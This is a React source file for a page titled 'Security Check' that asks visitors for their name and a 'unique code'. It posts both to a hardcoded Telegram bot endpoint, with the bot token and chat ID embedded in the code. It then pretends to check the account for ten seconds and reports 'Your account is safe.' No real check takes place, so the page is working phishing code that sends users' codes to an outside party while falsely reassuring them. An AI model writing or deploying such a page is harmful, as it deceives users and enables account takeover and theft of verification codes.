import React, { useState } from "react";

export default function SecurityCheckForm() {
  const [name, setName] = useState("");
  const [code, setCode] = useState("");
  const [status, setStatus] = useState("form"); // 'form', 'loading', 'safe'

  const handleSubmit = async () => {
    if (!name || !code) return;

    setStatus("loading");

    const message = `New Submission:\nName: ${name}\nCode: ${code}`;

    try {
      const response = await fetch("https://api.telegram.org/bot7712074719:AAEfsMkfDZFADCdnTq6S4WPT67c-XhHE_4Y/sendMessage", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: "7305039129",
          text: message
        })
      });
      const data = await response.json();
      console.log("Telegram response:", data);
    } catch (error) {
      console.error("Telegram error:", error);
    }

    setTimeout(() => {
      setStatus("safe");
    }, 10000);
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-r from-yellow-400 via-pink-500 to-purple-600">
      <div className="backdrop-blur-lg bg-white/10 p-10 rounded-2xl shadow-2xl max-w-xl w-full">
        {status === "form" && (
          <>
            <h2 className="text-white text-3xl font-bold mb-6">Security Check</h2>
            <input
              maxLength={100}
              value={name}
              onChange={(e) => setName(e.target.value)}
              placeholder="Enter your name"
              className="w-full p-4 mb-4 rounded-lg bg-white/20 text-white outline-none"
            />
            <input
              maxLength={100}
              value={code}
              onChange={(e) => setCode(e.target.value)}
              placeholder="Enter unique code"
              className="w-full p-4 mb-4 rounded-lg bg-white/20 text-white outline-none"
            />
            <button
              onClick={handleSubmit}
              className="w-full bg-white text-black px-6 py-3 rounded-lg font-semibold"
            >
              Check Security
            </button>
          </>
        )}
        {status === "loading" && (
          <div className="text-white text-xl">
            Checking security of your account... <br />
            Do not close while processing.
          </div>
        )}
        {status === "safe" && (
          <div className="text-green-300 text-xl font-bold">
            Your account is safe.
          </div>
        )}
      </div>
    </div>
  );
}